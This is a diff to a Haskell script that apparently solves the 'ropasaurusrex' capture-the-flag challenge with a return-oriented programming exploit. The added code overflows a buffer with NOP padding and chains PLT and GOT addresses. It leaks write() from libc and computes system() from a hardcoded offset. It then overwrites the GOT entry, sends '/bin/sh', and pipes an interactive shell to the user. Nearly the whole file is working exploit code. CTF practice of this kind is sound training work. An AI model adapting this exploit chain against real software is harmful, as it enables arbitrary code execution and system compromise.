@@ -15,28 +15,32 @@
 -- @
 {-# LANGUAGE ExtendedDefaultRules #-}
 {-# LANGUAGE OverloadedStrings #-}
+{-# LANGUAGE ScopedTypeVariables #-}
 {-# OPTIONS_GHC -Wall #-}
 
 -- Don't warn that things (like strings and numbers) are being defaulted to
 -- certain types.  It's okay because this is just shell programming.
 {-# OPTIONS_GHC -fno-warn-type-defaults #-}
 
-import Control.Monad (forM_, void)
-import Data.Binary (encode)
-import qualified Data.ByteString.Lazy as B
+import Control.Concurrent (threadDelay)
+import Control.Concurrent.Async (Concurrently(..))
+import Control.Monad.IO.Class (liftIO)
+import Data.Binary (encode, decode)
+import qualified Data.ByteString as B
+import qualified Data.ByteString.Char8 as C8
+import qualified Data.ByteString.Lazy as BL
 import Data.ByteString.Lazy (ByteString)
-import Data.Char (chr, ord)
-import Data.Conduit.Process (streamingProcess)
-import Data.Int (Int64)
+import Data.Conduit (($$), (=$), yield)
+import Data.Conduit.Binary as CB
+import Data.Conduit.List as CL
+import Data.Conduit.Process (streamingProcess, waitForStreamingProcess)
+import Data.Maybe (fromJust)
 import Data.Monoid ((<>))
 import qualified Data.Text as T
-import Data.Text (Text)
 import GHC.Word (Word32, Word8, byteSwap32)
 import Numeric (showHex)
-import Shelly ((</>), (<.>), (-|-), cmd, inspect, shelly, touchfile, withTmpDir)
-import System.IO (stderr)
-import System.Posix.Process (executeFile)
-import System.Process (callProcess, rawSystem)
+import System.IO (Handle, stdin, stderr)
+import System.Process (shell)
 
 -- Define the the types that should be defaulted to.  We can define one
 -- type for string-like things, and one type for integer-like things.  It
@@ -51,16 +55,16 @@ padTo :: Word32 -> ByteString -> ByteString
 padTo fullBufLength string = nopSled <> string
   where
     paddingLen :: Integer
-    paddingLen = toInteger fullBufLength - toInteger (B.length string)
+    paddingLen = toInteger fullBufLength - toInteger (BL.length string)
 
     nopSled :: ByteString
-    nopSled = B.replicate (fromInteger paddingLen) nop
+    nopSled = BL.replicate (fromInteger paddingLen) nop
 
 toAddr :: Word32 -> Word32
 toAddr = byteSwap32
 
 nops :: ByteString
-nops = B.replicate 140 nop
+nops = BL.replicate 140 nop
 
 readAddrPLT :: Word32
 readAddrPLT = toAddr 0x804832c
@@ -79,11 +83,11 @@ writeAddrPLT = toAddr 0x804830c
 writeAddressGOT :: Word32
 writeAddressGOT = toAddr 0x8049614
 
-exploit :: ByteString
-exploit = "abcd"
-
 popPopPopRetAddr :: Word32
 popPopPopRetAddr = toAddr 0x080484b6
+
+systemOffset :: Word32
+systemOffset = 0x0009d990
 
 -- TODO: This successfully prints out the address of the of write() in
 -- libc, and tries to read in an address of system() to write() to
@@ -112,27 +116,57 @@ paddedExploit = nops
         <> encode popPopPopRetAddr
         <> encode (toAddr 0)
         <> encode (toAddr 0x8049620) -- this is the .data section.
-                                      -- we could also use the .bss
-                                      -- at 0x08049628.
+                                     -- we could also use the .bss
+                                     -- at 0x08049628.
         <> encode (toAddr 8)
     <> encode writeAddrPLT -- this should be pointing to system()
-        <> B.replicate 4 nop
+        <> BL.replicate 4 nop
         <> encode (toAddr 0x8049620) -- TODO: what should these args be?
 
 main :: IO ()
 main = do
-    B.hPutStr stderr "\n"
-    B.hPutStr stderr "---------------\n"
-    B.hPutStr stderr "-- Started. --\n"
-    B.hPutStr stderr "---------------\n\n"
+    BL.hPutStr stderr "\n"
+    BL.hPutStr stderr "---------------\n"
+    BL.hPutStr stderr "-- Started. --\n"
+    BL.hPutStr stderr "---------------\n\n"
 
-    (pStdin, pStdout, _, _) <- streamingProcess $
+    (processStdin, processStdout, _ :: Handle, processHandle) <- streamingProcess $
         shell "./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"
 
-    -- B.putStrLn paddedExploit
+    -- BL.putStrLn paddedExploit
+    yield (BL.toStrict paddedExploit) $$ processStdin
+    writeAddrRaw <- fromJust <$> (processStdout $$ CL.head)
+    let writeAddr = toAddr . decode $ BL.fromStrict writeAddrRaw
+    let systemAddr = toAddr (writeAddr - systemOffset)
+    putStrLn $ showHex writeAddr ""
+    putStrLn $ showHex systemOffset ""
+    putStrLn $ showHex (toAddr systemAddr) ""
+    yield (BL.toStrict $ encode systemAddr) $$ processStdin
 
-    B.hPutStr stderr "\n"
-    B.hPutStr stderr "---------------\n"
-    B.hPutStr stderr "-- Finished. --\n"
-    B.hPutStr stderr "---------------\n\n"
+    -- putStrLn "waiting..."
+    -- threadDelay $ 1000000 * 1
+    -- putStrLn "done waiting."
+
+    yield "/bin/sh\0" $$ processStdin
+    -- output <- processStdout $$ CL.consume
+    -- putStrLn $ "output: " <> show output
+
+    let input = CB.sourceHandle stdin
+                    $$ processStdin
+        output = processStdout
+                    $$ CB.mapM_ (\bs -> putStr $ [toEnum $ fromEnum bs])
+
+
+    exitCode <- runConcurrently $
+                    Concurrently input *>
+                    Concurrently output *>
+                    Concurrently (waitForStreamingProcess processHandle)
+
+    -- exitCode <- waitForStreamingProcess processHandle
+    putStrLn $ "exitCode: " <> show exitCode
+
+    BL.hPutStr stderr "\n"
+    BL.hPutStr stderr "---------------\n"
+    BL.hPutStr stderr "-- Finished. --\n"
+    BL.hPutStr stderr "---------------\n\n"
 
